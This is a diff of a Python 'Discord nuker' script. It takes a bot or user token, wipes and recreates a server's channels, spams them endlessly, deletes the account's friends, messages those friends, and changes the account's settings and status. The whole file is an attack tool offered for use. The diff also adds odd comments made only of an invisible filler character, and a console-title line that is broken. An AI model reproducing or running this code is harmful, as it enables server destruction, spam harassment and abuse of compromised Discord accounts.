@@ -7,7 +7,6 @@
 
 import discord
 from discord.ext import commands
-from discord import Permissions
 from colorama import Fore
 import colorama
 import requests
@@ -19,6 +18,21 @@ import os
 
 colorama.init()
 
+system = os.name
+if system == 'nt':
+
+    import ctypes
+    ctypes.windll.kernel32.SetConsoleTitleW(f"Meow's Discord Nuker")
+
+elif system == 'posix':
+    import sys
+
+    sys.stdout.write(f"\x1b]0;", "Meow's Discord Nuker" ,"\x07")
+else:
+
+    pass
+
+
 def clear():
     from sys import platform
     if platform == "linux" or platform == "linux2":
@@ -28,19 +42,16 @@ def clear():
         os.system("cls")
 
 
-# Windows...
 
 print(Fore.LIGHTBLUE_EX + rf'''
-Version 0.5
 meow   __  __ _____ _____        ___ ____      _   _ _   _ _  _______ ____    meow
 meow  |  \/  | ____/ _ \ \      / ( ) ___|    | \ | | | | | |/ / ____|  _ \   meow
 meow  | |\/| |  _|| | | \ \ /\ / /|/\___ \    |  \| | | | | ' /|  _| | |_) |  meow
 meow  | |  | | |__| |_| |\ V  V /    ___) |   | |\  | |_| | . \| |___|  _ <   meow
 meow  |_|  |_|_____\___/  \_/\_/    |____/    |_| \_|\___/|_|\_\_____|_| \_\  meow
-Bot/Account nuker
-''')
-print(Fore.WHITE + """
-https://github.com/meowistic
+
+Bot/Account nuker''')
+print(Fore.WHITE + """https://github.com/meowistic
 """)
 
 try:
@@ -53,7 +64,7 @@ except FileNotFoundError:
 
 if token != "":
     tokenm = token[:-50]
-    print(Fore.YELLOW+ f"[*] Token imported from config [{tokenm+'*'*50}]")
+    print(Fore.YELLOW + f"[*] Token imported from config [{tokenm + '*' * 50}]")
     pass
 else:
     token = input(Fore.LIGHTBLUE_EX + "[?] Enter Your Bot/User Token: ")
@@ -156,7 +167,7 @@ def vtoken(token):
 
                         amount = int(
                             input(Fore.LIGHTBLUE_EX + "[?] Channel Amount (how many channels you'd like to create): "))
-                    except ValueError:
+                    except ValueError:#ㅤ
                         print(Fore.RED + "[-] Invalid input! It has to be a number.")
 
                         continue
@@ -178,25 +189,25 @@ def vtoken(token):
             @bot.event
             async def on_ready():
                 await bot.change_presence(activity=discord.Game(name="MEOW'S NUKER"))
-                print("[+] Logged in as " + bot.user.name)
+                print(Fore.LIGHTGREEN_EX+"[+] Logged in as " + bot.user.name)
                 print(Fore.YELLOW + f"[*] Waiting for command... ({prefix}meow)")
 
             @bot.command()
             async def stop(ctx):
                 await ctx.author.send('> **BOT HAS SHUT DOWN SUCCESSFULLY**')
+
                 exit()
 
             @bot.command()
             async def pause(ctx):
-            
+
                 print(Fore.YELLOW + "[*] Bot successfully stopped!")
-                raise Exception("stopped")
+                raise Exception("stopped")#ㅤ
 
             @bot.command()
             async def resume(ctx):
-                
-                guild = ctx.guild
 
+                guild = ctx.guild
 
                 for channel in guild.channels:
                     try:
@@ -211,10 +222,9 @@ def vtoken(token):
 
 
 
-
             @bot.command()
             async def meow(ctx):
-                global uid
+                global uid#ㅤ
                 uid = ctx.message.author.id
                 guild = ctx.guild
 
@@ -236,21 +246,24 @@ def vtoken(token):
                     await guild.create_text_channel(SPAM_CHANNEL)
                 print(Fore.YELLOW + f"[*] {guild.name} has been nuked!")
                 return
-
+            x = True
             @bot.event
             async def on_guild_channel_create(channel):
-                try:
-                    for i in range(9999999):
+
+                try:#ㅤ
+                    while x:
                         r = random.choice(SPAM_MESSAGE)
                         await channel.send(r)
 
-                        print(Fore.LIGHTGREEN_EX + f"[+] Successfully spammed message: {r} [x{i}]" + Fore.RESET)#
-                        clear()
-                except Exception:
-                    print(
-                        Fore.YELLOW + "[*] If you see this message, the exception has been passed and the bot stopped spamming.")
-                    return
+                        print(Fore.LIGHTGREEN_EX + f"[+] Successfully spammed message: {r}]" + Fore.RESET)
 
+                #TODO instead of closing it, stop the program with an input after exception is raised.
+
+                except Exception:
+                        if x:
+                            print(
+                            Fore.YELLOW + "[*] If you see this message, the exception has been passed and the bot stopped spamming.")
+                            input()
 
             bot.run(token)
 
@@ -272,7 +285,7 @@ def vtoken(token):
         def nuke(token, Server_Name, message_Content):
             try:
                 with open("config.json", "r") as f:
-                    f = json.load(f)
+                    f = json.load(f)#ㅤ
                     toke = f["token"]
                     amount = f["amount"]
                     nick = f["nickname"]
@@ -325,7 +338,7 @@ def vtoken(token):
                                      headers=getheaders(token)).json()
             for friend in friendIds:
                 try:
-                    requests.delete(
+                    requests.delete(#ㅤ
                         f'https://discord.com/api/v9/users/@me/relationships/' + friend['id'],
                         headers=getheaders(token))
                     print(f"removed friend: " + friend['user']['username'] + "#" + friend['user'][
@@ -354,7 +367,7 @@ def vtoken(token):
                 'render_embeds': False,
                 'render_reactions': False,
                 'animate_emoji': False,
-                'convert_emoticons': False,
+                'convert_emoticons': False,#ㅤ
                 'enable_tts_command': False,
                 'explicit_content_filter': '0',
                 "custom_status": {"text": f"https://github.com/meowistic/discord-token-nuker"},
@@ -370,7 +383,7 @@ def vtoken(token):
 
         Server_Name = f"{nick} ON TOP"
 
-        message_Content = str(input(
+        message_Content = str(input(#ㅤ
             Fore.LIGHTBLUE_EX + "[?] Message to send to the user's friends: "))
 
         nuke(token=token, Server_Name=Server_Name, message_Content=message_Content)
